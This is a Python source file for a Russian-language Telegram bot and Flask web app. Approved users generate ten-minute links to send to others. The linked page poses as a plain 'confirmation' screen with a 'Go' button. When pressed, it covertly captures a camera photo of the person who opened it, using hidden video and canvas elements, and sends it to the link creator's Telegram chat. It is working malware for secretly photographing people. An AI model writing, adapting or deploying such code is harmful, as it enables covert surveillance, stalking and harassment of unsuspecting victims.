import telebot
from telebot import types
import threading
import secrets
from flask import Flask, request, jsonify
import os
import base64
import time
import re
import sqlite3
from datetime import datetime, timedelta
import json

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not set!")

BOT_USERNAME = os.environ.get('BOT_USERNAME', 'genphototikbot')
MAX_USES = int(os.environ.get('MAX_USES', 3))
ADMIN_ID = int(os.environ.get('ADMIN_ID', 957881887))

print("="*50)
print(f"🤖 Бот: @{BOT_USERNAME}")
print(f"👑 Админ ID: {ADMIN_ID}")
print("="*50)
# ================================

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ========== РАБОТА С SQLite ==========
DB_PATH = '/tmp/bot_data.db'  # Render сохраняет /tmp

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            is_allowed INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cur.execute('''
        CREATE TABLE IF NOT EXISTS links (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses INTEGER DEFAULT 0,
            max_uses INTEGER DEFAULT 3,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP
        )
    ''')
    
    cur.execute('''
        CREATE TABLE IF NOT EXISTS access_requests (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cur.execute('''
        CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            reason TEXT,
            banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ SQLite база данных инициализирована")

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cur.fetchone()
    conn.close()
    return dict(user) if user else None

def add_user(user_id, username):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO users (user_id, username) 
        VALUES (?, ?) 
        ON CONFLICT(user_id) DO UPDATE SET username = excluded.username
    ''', (user_id, username))
    conn.commit()
    conn.close()

def allow_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('UPDATE users SET is_allowed = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def deny_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('UPDATE users SET is_allowed = 0 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def ban_user(user_id, reason="Нарушение правил"):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('INSERT OR IGNORE INTO banned_users (user_id, reason) VALUES (?, ?)', (user_id, reason))
    cur.execute('UPDATE users SET is_allowed = 0, is_banned = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('DELETE FROM banned_users WHERE user_id = ?', (user_id,))
    cur.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def is_banned(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('SELECT 1 FROM banned_users WHERE user_id = ?', (user_id,))
    banned = cur.fetchone() is not None
    conn.close()
    return banned

def save_access_request(user_id, username):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO access_requests (user_id, username) 
        VALUES (?, ?) 
        ON CONFLICT(user_id) DO UPDATE SET requested_at = CURRENT_TIMESTAMP
    ''', (user_id, username))
    conn.commit()
    conn.close()

def remove_access_request(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('DELETE FROM access_requests WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def get_access_requests():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute('SELECT * FROM access_requests ORDER BY requested_at DESC')
    requests = [dict(r) for r in cur.fetchall()]
    conn.close()
    return requests

def get_allowed_users():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute('SELECT user_id, username FROM users WHERE is_allowed = 1 AND is_banned = 0')
    users = [dict(u) for u in cur.fetchall()]
    conn.close()
    return users

def save_link(code, owner_id, max_uses=MAX_USES):
    expires_at = (datetime.now() + timedelta(minutes=10)).isoformat()
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO links (code, owner_id, max_uses, expires_at)
        VALUES (?, ?, ?, ?)
    ''', (code, owner_id, max_uses, expires_at))
    conn.commit()
    conn.close()
    print(f"✅ Ссылка {code} сохранена")

def get_link(code):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute('SELECT * FROM links WHERE code = ?', (code,))
    link = cur.fetchone()
    conn.close()
    if link:
        link = dict(link)
        # Проверка на истечение
        expires_at = datetime.fromisoformat(link['expires_at'])
        if datetime.now() > expires_at:
            delete_link(code)
            return None
        return link
    return None

def delete_link(code):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('DELETE FROM links WHERE code = ?', (code,))
    conn.commit()
    conn.close()

def update_link_uses(code, uses):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('UPDATE links SET uses = ? WHERE code = ?', (uses, code))
    conn.commit()
    conn.close()

# Инициализация БД
init_db()

# ========== HTML СТРАНИЦА ==========
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Подтверждение</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, sans-serif;
        }
        .container { text-align: center; padding: 20px; }
        .status { font-size: 28px; color: white; font-weight: bold; margin-bottom: 15px; }
        .sub { font-size: 16px; color: rgba(255,255,255,0.8); }
        button {
            background: white;
            border: none;
            padding: 18px 50px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
            color: #667eea;
        }
        button:active { transform: scale(0.97); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="status" id="status">🔗</div>
        <div class="sub" id="sub"></div>
        <button id="btn">Перейти</button>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        const statusDiv = document.getElementById('status');
        const subDiv = document.getElementById('sub');
        const btn = document.getElementById('btn');
        
        let code = null;
        
        if (tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
            code = tg.initDataUnsafe.start_param;
        }
        
        if (!code) {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('startapp')) {
                code = urlParams.get('startapp');
            }
        }
        
        btn.onclick = async () => {
            if (!code) {
                statusDiv.innerHTML = '❌';
                subDiv.innerHTML = 'Ошибка';
                return;
            }
            
            btn.disabled = true;
            statusDiv.innerHTML = '⏳';
            subDiv.innerHTML = 'Подождите...';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                document.body.appendChild(video);
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 200);
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.85);
                
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                canvas.remove();
                
                statusDiv.innerHTML = '📤';
                subDiv.innerHTML = 'Отправка...';
                
                const response = await fetch('/send_photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code: code, photo: photoData })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    statusDiv.innerHTML = '✅';
                    subDiv.innerHTML = 'Готово!';
                    setTimeout(() => tg.close(), 1500);
                } else if (result.error === 'limit_reached') {
                    statusDiv.innerHTML = '❌';
                    subDiv.innerHTML = 'Лимит использован';
                } else if (result.error === 'not_found') {
                    statusDiv.innerHTML = '❌';
                    subDiv.innerHTML = 'Ссылка недействительна';
                } else {
                    throw new Error();
                }
            } catch (err) {
                statusDiv.innerHTML = '❌';
                subDiv.innerHTML = 'Разрешите камеру';
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
'''

@app.route('/webapp')
def webapp_root():
    return HTML_PAGE

@app.route('/webapp/<code>')
def webapp_with_code(code):
    return HTML_PAGE

@app.route('/send_photo', methods=['POST'])
def receive_photo():
    data = request.json
    link_code = data.get('code')
    photo_data = data.get('photo')
    
    print(f"📸 Получен код: '{link_code}'")
    
    link_info = get_link(link_code)
    
    if not link_info:
        print(f"❌ Ссылка не найдена")
        return jsonify({'success': False, 'error': 'not_found'}), 400
    
    if link_info['uses'] >= link_info['max_uses']:
        print(f"📊 Лимит использован")
        return jsonify({'success': False, 'error': 'limit_reached'}), 400
    
    chat_id = link_info['owner_id']
    new_uses = link_info['uses'] + 1
    update_link_uses(link_code, new_uses)
    
    photo_data = re.sub('^data:image/.+;base64,', '', photo_data)
    photo_bytes = base64.b64decode(photo_data)
    
    temp_path = f'/tmp/photo_{int(time.time())}.jpg'
    with open(temp_path, 'wb') as f:
        f.write(photo_bytes)
    
    with open(temp_path, 'rb') as photo:
        bot.send_photo(chat_id, photo, caption=f"✅ Фото! (Осталось: {link_info['max_uses'] - new_uses})")
    os.remove(temp_path)
    
    if new_uses >= link_info['max_uses']:
        delete_link(link_code)
    
    print(f"✅ Фото отправлено")
    return jsonify({'success': True})

def is_allowed(user_id):
    if is_banned(user_id):
        return False
    user = get_user(user_id)
    return user and user['is_allowed'] == 1 if user else False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    add_user(user_id, username)
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, "❌ *ДОСТУП ЗАБЛОКИРОВАН*", parse_mode='Markdown')
        return
    
    if is_allowed(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton('🔗 Создать ссылку', callback_data='create_link')
        markup.add(btn)
        bot.send_message(
            message.chat.id,
            f"👋 Привет, {username}!\n\nНажми на кнопку, чтобы создать ссылку.\n📊 Ссылка работает для {MAX_USES} человек.",
            reply_markup=markup
        )
    else:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton('📝 Запросить доступ', callback_data='request_access')
        markup.add(btn)
        bot.send_message(
            message.chat.id,
            f"👋 Привет, {username}!\n\n❌ У вас нет доступа.\n\nНажмите на кнопку, чтобы отправить запрос.",
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    username = call.from_user.username or call.from_user.first_name
    
    if call.data == 'request_access':
        if is_banned(user_id):
            bot.answer_callback_query(call.id, "❌ Вы заблокированы!", show_alert=True)
            return
        
        save_access_request(user_id, username)
        
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton('✅ РАЗРЕШИТЬ', callback_data=f'allow_{user_id}'),
            types.InlineKeyboardButton('❌ ОТКЛОНИТЬ', callback_data=f'deny_{user_id}'),
            types.InlineKeyboardButton('🚫 ЗАБЛОКИРОВАТЬ', callback_data=f'ban_{user_id}')
        )
        
        bot.send_message(
            ADMIN_ID,
            f"🔔 *НОВЫЙ ЗАПРОС*\n\n👤 @{username}\n🆔 `{user_id}`",
            parse_mode='Markdown',
            reply_markup=markup
        )
        
        bot.answer_callback_query(call.id, "Запрос отправлен!")
        bot.send_message(call.message.chat.id, "✅ Запрос отправлен!")
    
    elif call.data == 'create_link':
        if not is_allowed(user_id):
            bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
            return
        
        code = secrets.token_urlsafe(16)
        save_link(code, call.message.chat.id)
        
        direct_link = f"https://t.me/{BOT_USERNAME}/webapp?startapp={code}"
        
        bot.send_message(
            call.message.chat.id,
            f"✅ *Ссылка готова!*\n\n🔗 `{direct_link}`\n\n📤 Отправь другу.\n⚠️ Активна 10 минут.\n📊 {MAX_USES} человека.",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        bot.answer_callback_query(call.id)
    
    elif call.data.startswith('allow_'):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "Только для админа!")
            return
        
        target_id = int(call.data.split('_')[1])
        allow_user(target_id)
        remove_access_request(target_id)
        
        bot.edit_message_text(f"✅ РАЗРЕШЁН: {target_id}", call.message.chat.id, call.message.message_id)
        
        try:
            bot.send_message(target_id, "✅ *ДОСТУП РАЗРЁШЕН!*\n\nОтправьте /start", parse_mode='Markdown')
        except:
            pass
        
        bot.answer_callback_query(call.id, "Доступ разрешён!")
    
    elif call.data.startswith('deny_'):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "Только для админа!")
            return
        
        target_id = int(call.data.split('_')[1])
        remove_access_request(target_id)
        
        bot.edit_message_text(f"❌ ОТКЛОНЁН: {target_id}", call.message.chat.id, call.message.message_id)
        
        try:
            bot.send_message(target_id, "❌ *ДОСТУП ОТКЛОНЁН*", parse_mode='Markdown')
        except:
            pass
        
        bot.answer_callback_query(call.id, "Доступ отклонён")
    
    elif call.data.startswith('ban_'):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "Только для админа!")
            return
        
        target_id = int(call.data.split('_')[1])
        ban_user(target_id)
        remove_access_request(target_id)
        
        bot.edit_message_text(f"🚫 ЗАБЛОКИРОВАН: {target_id}", call.message.chat.id, call.message.message_id)
        
        try:
            bot.send_message(target_id, "🚫 *ВЫ ЗАБЛОКИРОВАНЫ*", parse_mode='Markdown')
        except:
            pass
        
        bot.answer_callback_query(call.id, "Пользователь заблокирован")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    users = get_allowed_users()
    requests = get_access_requests()
    
    text = "📋 *РАЗРЕШЁННЫЕ:*\n"
    for u in users:
        text += f"• @{u['username'] or u['user_id']} (`{u['user_id']}`)\n"
    
    text += f"\n📝 *ЗАПРОСЫ:*\n"
    for r in requests:
        text += f"• @{r['username'] or r['user_id']} (`{r['user_id']}`)\n"
    
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(ADMIN_ID, "Использование: /revoke ID")
            return
        
        target_id = int(parts[1])
        deny_user(target_id)
        bot.send_message(ADMIN_ID, f"✅ Доступ отозван у {target_id}")
    except:
        bot.send_message(ADMIN_ID, "❌ Ошибка")

@bot.message_handler(commands=['unban'])
def unban(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(ADMIN_ID, "Использование: /unban ID")
            return
        
        target_id = int(parts[1])
        unban_user(target_id)
        bot.send_message(ADMIN_ID, f"✅ Пользователь {target_id} разблокирован")
    except:
        bot.send_message(ADMIN_ID, "❌ Ошибка")

@bot.message_handler(commands=['banned'])
def list_banned(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute('SELECT * FROM banned_users')
    banned = [dict(b) for b in cur.fetchall()]
    conn.close()
    
    if not banned:
        bot.send_message(ADMIN_ID, "📋 Нет заблокированных пользователей")
        return
    
    text = "🚫 *ЗАБЛОКИРОВАННЫЕ:*\n"
    for b in banned:
        text += f"• ID: `{b['user_id']}` - {b['reason']}\n"
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)

threading.Thread(target=run_flask, daemon=True).start()

print("="*50)
print("✅ БОТ ЗАПУЩЕН")
print(f"🤖 Бот: @{BOT_USERNAME}")
print("="*50)

bot.polling(none_stop=True)
